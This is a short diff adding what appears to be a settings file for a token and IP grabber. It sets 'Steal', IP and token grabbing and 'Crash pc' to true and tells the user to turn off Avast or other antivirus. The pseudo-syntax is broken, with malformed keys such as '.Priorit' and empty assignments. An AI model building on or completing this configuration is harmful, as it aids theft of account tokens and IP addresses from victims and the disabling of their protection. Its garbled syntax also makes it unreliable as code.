@@ -1,0 +1,16 @@
+.tokens =add.auto
+ ='Id'
+ ='token'
+.Priorit
+Owner = (Skefin <3)
+.Rules
+ Turn off Avast/anti-virus-program
+.Auto
+  = 'Ip'[Auto]
+  = 'Steal'[Custom]
+  = 'Version'[1.5.3] 
+.Grabber / tgs
+  Ip = *true
+ Token = *true
+  Camera = *false
+ Crash pc = *true
